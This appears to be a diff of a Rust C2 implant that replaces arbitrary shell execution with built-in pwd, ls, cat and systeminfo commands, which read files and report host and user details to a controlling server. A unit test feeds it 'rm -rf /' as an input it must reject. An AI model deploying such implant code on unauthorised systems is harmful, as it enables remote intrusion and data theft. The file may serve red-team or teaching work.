@@ -1,15 +1,12 @@
 use clap::Parser;
 use reqwest::Client;
-use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::{
     net::UdpSocket,
-    process::Command,
     time::{Duration, SystemTime},
 };
 use tokio::time::sleep;
 use uuid::Uuid;
-use whoami;
 
 use rb::message::{CheckinResponse, CommandOutput, ImplantCheckin};
 use rb::task::{Task, TaskResult, TaskStatus};
@@ -99,53 +96,8 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
 
         for task in tasks {
             println!("Executing command: {}", task.command);
-            let now = SystemTime::now();
 
-            // Build the full script string so arguments land inside the command rather than as
-            // flags on the shell itself.
-            let full_command = build_command_string(&task.command, &task.args);
-
-            // Shell out the command (use powershell on Windows)
-            let result = if cfg!(target_os = "windows") {
-                Command::new("powershell")
-                    .args(["-NoProfile", "-Command", &full_command])
-                    .output()
-            } else {
-                Command::new("sh").args(["-c", &full_command]).output()
-            };
-
-            let task_result = match result {
-                Ok(output) => {
-                    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-                    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-                    let combined_output = format!("{}{}", stdout, stderr);
-
-                    TaskResult {
-                        task_id: task.id,
-                        implant_id,
-                        session_id: task.session_id,
-                        output: CommandOutput::Text(combined_output),
-                        status: TaskStatus::Completed,
-                        status_code: output.status.code(),
-                        completed_at: now,
-                        error: None, // No error for successful execution
-                    }
-                }
-                Err(e) => {
-                    let error_msg = format!("Failed to spawn command: {}", e);
-
-                    TaskResult {
-                        task_id: task.id,
-                        implant_id,
-                        session_id: task.session_id,
-                        output: CommandOutput::None,
-                        status: TaskStatus::Failed,
-                        status_code: None,
-                        completed_at: now,
-                        error: Some(error_msg),
-                    }
-                }
-            };
+            let task_result = run_command(&task, implant_id);
 
             // Post the result back
             if let Err(e) = client
@@ -169,12 +121,115 @@ fn get_local_ip(target_host: &str, target_port: u16) -> Result<String, Box<dyn E
     Ok(socket.local_addr()?.ip().to_string())
 }
 
-/// Join a command and its arguments into a single shell script string.
-pub fn build_command_string(command: &str, args: &[String]) -> String {
-    if args.is_empty() {
-        command.to_string()
-    } else {
-        format!("{} {}", command, args.join(" "))
+/// Dispatch a task to the native command implementation and build its result.
+pub fn run_command(task: &Task, implant_id: Uuid) -> TaskResult {
+    let now = SystemTime::now();
+
+    let result = match task.command.as_str() {
+        "pwd" => cmd_pwd(&task.args),
+        "ls" => cmd_ls(&task.args),
+        "cat" => cmd_cat(&task.args),
+        "systeminfo" => cmd_systeminfo(&task.args),
+        other => Err(format!(
+            "Unknown command '{}'. Supported commands: pwd, ls, cat, systeminfo",
+            other
+        )),
+    };
+
+    match result {
+        Ok(output) => TaskResult {
+            task_id: task.id,
+            implant_id,
+            session_id: task.session_id,
+            output,
+            error: None,
+            status_code: Some(0),
+            status: TaskStatus::Completed,
+            completed_at: now,
+        },
+        Err(error) => TaskResult {
+            task_id: task.id,
+            implant_id,
+            session_id: task.session_id,
+            output: CommandOutput::None,
+            error: Some(error),
+            status_code: Some(1),
+            status: TaskStatus::Failed,
+            completed_at: now,
+        },
+    }
+}
+
+fn cmd_pwd(_args: &[String]) -> Result<CommandOutput, String> {
+    let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
+    Ok(CommandOutput::Text(cwd.display().to_string()))
+}
+
+fn cmd_ls(args: &[String]) -> Result<CommandOutput, String> {
+    let path = args.first().map(String::as_str).unwrap_or(".");
+    let entries = std::fs::read_dir(path).map_err(|e| format!("{}: {}", path, e))?;
+
+    let headers = ["Name", "Type", "Size", "Modified"]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+
+    let mut rows: Vec<Vec<String>> = Vec::new();
+    for entry in entries {
+        let entry = entry.map_err(|e| e.to_string())?;
+        let metadata = entry.metadata().ok();
+        let kind = match &metadata {
+            Some(m) if m.is_dir() => "dir",
+            _ => "file",
+        };
+        let size = metadata
+            .as_ref()
+            .map(|m| m.len().to_string())
+            .unwrap_or_default();
+        let modified = metadata
+            .as_ref()
+            .and_then(|m| m.modified().ok())
+            .map(format_time)
+            .unwrap_or_default();
+
+        rows.push(vec![
+            entry.file_name().to_string_lossy().to_string(),
+            kind.to_string(),
+            size,
+            modified,
+        ]);
+    }
+    rows.sort_by(|a, b| a[0].cmp(&b[0]));
+
+    Ok(CommandOutput::Table { headers, rows })
+}
+
+fn cmd_cat(args: &[String]) -> Result<CommandOutput, String> {
+    let path = args
+        .first()
+        .ok_or_else(|| "usage: cat <file>".to_string())?;
+    let contents = std::fs::read_to_string(path).map_err(|e| format!("{}: {}", path, e))?;
+    Ok(CommandOutput::Text(contents))
+}
+
+fn cmd_systeminfo(_args: &[String]) -> Result<CommandOutput, String> {
+    let cwd = std::env::current_dir()
+        .map(|p| p.display().to_string())
+        .unwrap_or_default();
+    Ok(CommandOutput::Json(serde_json::json!({
+        "hostname": whoami::fallible::hostname().unwrap_or_default(),
+        "username": whoami::username(),
+        "os": whoami::distro(),
+        "arch": std::env::consts::ARCH,
+        "pid": std::process::id(),
+        "cwd": cwd,
+    })))
+}
+
+fn format_time(time: SystemTime) -> String {
+    match time.duration_since(std::time::UNIX_EPOCH) {
+        Ok(d) => d.as_secs().to_string(),
+        Err(_) => "unknown".to_string(),
     }
 }
 
@@ -182,14 +237,70 @@ pub fn build_command_string(command: &str, args: &[String]) -> String {
 mod tests {
     use super::*;
 
-    #[test]
-    fn build_command_string_without_args() {
-        assert_eq!(build_command_string("whoami", &[]), "whoami");
+    fn task(command: &str, args: &[&str]) -> Task {
+        Task {
+            id: Uuid::new_v4(),
+            implant_id: Uuid::new_v4(),
+            session_id: 0,
+            command: command.to_string(),
+            args: args.iter().map(|s| s.to_string()).collect(),
+            created_at: SystemTime::now(),
+            status: TaskStatus::Pending,
+        }
     }
 
     #[test]
-    fn build_command_string_with_args() {
-        let args = vec!["hello".to_string(), "world".to_string()];
-        assert_eq!(build_command_string("echo", &args), "echo hello world");
+    fn pwd_returns_a_path() {
+        match cmd_pwd(&[]).unwrap() {
+            CommandOutput::Text(text) => assert!(!text.is_empty()),
+            _ => panic!("expected text output"),
+        }
+    }
+
+    #[test]
+    fn ls_lists_a_known_file() {
+        let dir = std::env::temp_dir().join(format!("rb_ls_{}", Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join("marker.txt"), b"hi").unwrap();
+
+        match cmd_ls(&[dir.display().to_string()]).unwrap() {
+            CommandOutput::Table { rows, .. } => {
+                assert!(rows.iter().any(|row| row[0] == "marker.txt"));
+            }
+            _ => panic!("expected table output"),
+        }
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn cat_reads_a_file() {
+        let file = std::env::temp_dir().join(format!("rb_cat_{}.txt", Uuid::new_v4()));
+        std::fs::write(&file, "hello implant").unwrap();
+
+        match cmd_cat(&[file.display().to_string()]).unwrap() {
+            CommandOutput::Text(text) => assert_eq!(text, "hello implant"),
+            _ => panic!("expected text output"),
+        }
+
+        let _ = std::fs::remove_file(&file);
+    }
+
+    #[test]
+    fn known_command_completes() {
+        let task = task("systeminfo", &[]);
+        let result = run_command(&task, task.implant_id);
+        assert_eq!(result.status, TaskStatus::Completed);
+    }
+
+    #[test]
+    fn unknown_command_fails() {
+        let task = task("rm", &["-rf", "/"]);
+        let result = run_command(&task, task.implant_id);
+        assert_eq!(result.status, TaskStatus::Failed);
+        assert!(result
+            .error
+            .unwrap_or_default()
+            .contains("Unknown command"));
     }
 }
